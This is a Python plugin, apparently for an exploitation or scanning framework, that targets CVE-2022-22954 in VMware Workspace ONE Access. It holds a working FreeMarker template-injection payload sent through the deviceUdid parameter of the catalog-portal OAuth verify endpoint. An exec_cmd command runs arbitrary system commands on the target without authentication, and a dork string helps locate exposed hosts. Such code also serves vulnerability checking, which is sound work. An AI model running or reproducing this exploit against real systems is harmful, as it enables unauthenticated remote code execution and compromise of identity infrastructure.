# -*-* coding:UTF-8
import re
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "VMware Workspace ONE Access SSTI漏洞",
        "dork": "app=\"vmware-Workspace-ONE-Access\"",
        "description": "VMware Workspace ONE Access（以前称为VMware Identity Manager）旨在通过多因素身份验证、条件访问和单点登录，让您的员工更快地访问SaaS、Web和本机移动应用程序。其中的CVE-2022-22954是一个匿名服务器模板注入漏洞，未经身份验证的攻击者可以利用此漏洞进行远程任意代码执行",
        "references": ["-"],
    }

    def url(self) -> dict:
        random_str = self.build_random_str(12)
        res = self.exec_cmd(self.target.value, f"echo {random_str}")
        if res and random_str in res:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        cmd = f'echo <--- && {cmd} && echo --->'.replace('&', '%26')
        pl = urllib.parse.quote(f"${{\"freemarker.template.utility.Execute\"?new()(\"echo {cmd}\")}}")
        r = self.request(
            method='get',
            url=urllib.parse.urljoin(url, f'./catalog-portal/ui/oauth/verify?error=&deviceUdid={pl}'), timeout=15,
        )
        if r.status_code == 200:
            match = re.search('<---(.*?)--->', r.text, re.S)
            if match:
                result = match.group(1)
                return result
